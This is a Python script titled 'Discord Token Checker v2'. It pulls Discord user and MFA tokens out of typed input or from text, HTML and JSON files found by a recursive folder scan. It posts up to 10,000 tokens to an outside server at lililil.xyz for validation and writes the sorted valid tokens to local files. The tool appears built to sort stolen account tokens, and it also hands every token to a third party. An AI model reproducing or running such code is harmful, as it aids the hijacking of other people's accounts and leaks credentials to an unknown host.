import json
import math
import os
import re
from pathlib import Path
from sys import exit

import jwt
import requests
from colorama import Fore


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def fast_exit(error):
    print()
    print(error)
    print()
    input(f"{Fore.RESET}Press Enter button for exit.")
    cls()
    exit()


class Checker:
    def __init__(self):
        self.url = "https://lililil.xyz/checker"
        self.tokens_not_parsed = ""
        self.tokens_parsed = []
        self.res = {}

    def main(self):
        cls()
        print(fr"""
   ___  _                     __  ______     __              _______           __                  ___ 
  / _ \(_)__ _______  _______/ / /_  __/__  / /_____ ___    / ___/ /  ___ ____/ /_____ ____  _  __|_  |
 / // / (_-</ __/ _ \/ __/ _  /   / / / _ \/  '_/ -_) _ \  / /__/ _ \/ -_) __/  '_/ -_) __/ | |/ / __/ 
/____/_/___/\__/\___/_/  \_,_/   /_/  \___/_/\_\\__/_//_/  \___/_//_/\__/\__/_/\_\\__/_/    |___/____/ 
                                                                                           {Fore.CYAN}by GuFFy_OwO
{Fore.RESET} 
""")

        print(f"{Fore.RESET}[{Fore.CYAN}1{Fore.RESET}] Enter token")
        print(f"{Fore.RESET}[{Fore.CYAN}2{Fore.RESET}] Check file")
        print()
        check_type = input(f"{Fore.CYAN}>{Fore.RESET}Select An Option{Fore.CYAN}:{Fore.RESET} ")

        if "1" in check_type:
            print()
            self.tokens_not_parsed = input(f"{Fore.CYAN}>{Fore.RESET}Enter tokens{Fore.CYAN}:{Fore.RESET} ")
        elif "2" in check_type:
            print()
            token_file_name = input(
                f"{Fore.CYAN}>{Fore.RESET}Enter the directory of the files or file in which are the unchecked tokens"
                f"{Fore.CYAN}:{Fore.RESET} "
            )
            if not os.path.exists(token_file_name):
                fast_exit(f"{token_file_name} directory not exist.")

            if os.path.isfile(token_file_name):
                with open(token_file_name, "r", encoding="utf-8") as f:
                    self.tokens_not_parsed = f.read()
            else:
                types = ["*.txt", "*.html", "*.json"]
                for search_type in types:
                    for path in Path(token_file_name).rglob(search_type):
                        with open(path, "r", encoding="utf-8") as f:
                            self.tokens_not_parsed += f.read()
        else:
            fast_exit("Invalid Option.")

    def parse_tokens(self):
        pre_parsed = []
        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
            for token in re.findall(regex, self.tokens_not_parsed):
                pre_parsed.append(token)
        pre_parsed = list(dict.fromkeys(pre_parsed))

        for token in pre_parsed:
            try:
                jwt.decode(token, options={"verify_signature": False})
            except Exception as e:
                if str(e) == "Invalid header string: must be a json object" or str(e) == "Not enough segments":
                    self.tokens_parsed.append(token)

        if len(self.tokens_parsed) > 10000:
            fast_exit(
                f"The current API limit is {Fore.CYAN}10000{Fore.RESET} tokens. Please sort the tokens by removing the "
                f"cherished invalid tokens. Amount of sorted tokens - {Fore.CYAN}{len(self.tokens_parsed)}{Fore.RESET}."
            )
        elif len(self.tokens_parsed) == 0:
            fast_exit("Parser did not found tokens.")

    def send_tokens(self):
        print()

        tokens_length = 2500 if len(self.tokens_parsed) > 2500 else len(self.tokens_parsed)
        time = int(round(10 * math.sqrt(tokens_length) * len(self.tokens_parsed) * 1.5 / 1000 / 60))

        print(
            f"Send tokens... Verification of tokens can take some time. "
            f"{Fore.CYAN}{len(self.tokens_parsed)}{Fore.RESET} tokens - {Fore.CYAN}{time}{Fore.RESET} min."
        )

        try:
            res = requests.post(self.url, json={"action": "checker", "data": self.tokens_parsed})

            if res.status_code == 429:
                fast_exit(
                    f"Too many tokens check, try after "
                    f"{Fore.CYAN}{res.headers['RateLimit-Reset']}{Fore.RESET} seconds..."
                )
            elif res.status_code != 200:
                fast_exit(f"Status code is {Fore.CYAN}{res.status_code}{Fore.RESET}. {res.json()}")

            self.res = res.json()
        except Exception as e:
            fast_exit(f"An error occurred while trying to send the file to the server. {str(e)}")

    def save_res(self):
        result = ""
        for token_type in self.res["tokensInfo"].keys():
            if self.res["tokensInfo"][token_type]:
                result += f"{token_type} - {Fore.CYAN}{len(self.res['tokensInfo'][token_type])}{Fore.RESET}, "
                with open(token_type + ".txt", "w") as f:
                    for item in self.res["tokensInfo"][token_type]:
                        f.write("%s\n" % item)

        with open("json_data.json", "w") as f:
            json.dump(self.res, f, indent=4)

        fast_exit(f"Tokens saved!\n\nStats: {result[:-3]}")


if __name__ == "__main__":
    checker = Checker()
    checker.main()
    checker.parse_tokens()
    checker.send_tokens()
    checker.save_res()
